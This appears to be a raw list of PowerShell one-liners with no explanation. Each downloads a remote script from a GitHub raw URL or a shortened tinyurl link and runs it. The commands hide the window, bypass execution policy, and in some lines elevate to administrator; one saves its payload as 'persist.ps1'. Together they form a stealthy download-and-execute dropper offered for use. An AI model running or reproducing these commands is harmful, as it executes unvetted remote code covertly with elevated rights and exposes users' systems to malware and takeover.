powershell -WindowStyle Hidden -Command \" $url='https://raw.githubusercontent.com/tanishqDevx/code_ps/main/code2.ps1'; $temp='$env:TEMP\\\\persist.ps1'; Invoke-WebRequest -Uri $url -OutFile $temp; PowerShell -ExecutionPolicy Bypass -WindowStyle Hidden -File $temp\"
powershell -WindowStyle Hidden -Command "Invoke-WebRequest 'https://tinyurl.com/mvekhxk9' -OutFile \"$env:TEMP\test.ps1\"; PowerShell -ExecutionPolicy Bypass -WindowStyle Hidden -File \"$env:TEMP\test.ps1\""
powershell -c \"iex (iwr https://tinyurl.com/mvekhxk9)\"
powershell -W Hidden -c "iwr https://raw.githubusercontent.com/tanishqDevx/code_ps/main/code2.ps1 -O $env:TEMP\test.ps1; Start-Process -WindowStyle Hidden powershell '-EP Bypass -File $env:TEMP\test.ps1'"
# Run PowerShell as Administrator, then execute:
Start-Process powershell -Verb RunAs -ArgumentList "-WindowStyle Hidden -Command `"Invoke-WebRequest 'https://tinyurl.com/mvekhxk9' -OutFile `$env:TEMP\test.ps1; PowerShell -ExecutionPolicy Bypass -WindowStyle Hidden -File `$env:TEMP\test.ps1`""
powershell -c "saps powershell -Verb RunAs -Args '-w Hidden -c \"iwr https://tinyurl.com/mvekhxk9 -OutFile %TEMP%\t.ps1; powershell -w Hidden -f %TEMP%\t.ps1\"'"
